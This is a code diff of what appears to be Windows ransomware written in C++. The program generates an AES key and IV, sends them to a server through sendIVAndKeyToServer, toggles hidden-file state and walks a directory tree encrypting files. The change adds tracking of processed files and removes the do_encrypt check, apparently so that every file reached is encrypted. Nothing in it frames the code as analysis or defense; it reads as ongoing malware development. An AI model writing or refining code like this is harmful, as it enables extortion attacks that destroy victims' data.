@@ -14,8 +14,6 @@ string get_username();
 void send();
 void notify();
 DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
-
-
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 Status sendIVAndKeyToServer(PBYTE masterIV, PBYTE masterKey, PBYTE id);
 void changeHiddenFileState(bool state);
@@ -48,6 +46,7 @@ int main(int argc, char* argv[]) {
 	PBYTE id = nullptr;
 	HANDLE hCurrentProcess = nullptr;
 	HANDLE hJob = nullptr;
+	std::vector<string> processed;
 	/* let's begin*/
 	Status status = generateKeyAndIV(&masterIV, &masterKey);
 	if (!NT_SUCCESS(status))
@@ -101,7 +100,7 @@ int main(int argc, char* argv[]) {
 #endif
 
 //	encrypt(path, masterIV, masterKey);
-	iterate(path, &encrypt, masterIV, masterKey);
+	iterate2(path, &encrypt, masterIV, masterKey, processed);
 
 //#ifdef DEBUG
 //	std::cout << "Username: " << get_username() << std::endl;
@@ -289,7 +288,6 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 
 void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 {
-	if (!do_encrypt(path)) return;
 	DWORD status;
 	PBYTE plainText = nullptr;
 	size_t plainTextLen = getFileSize(path);
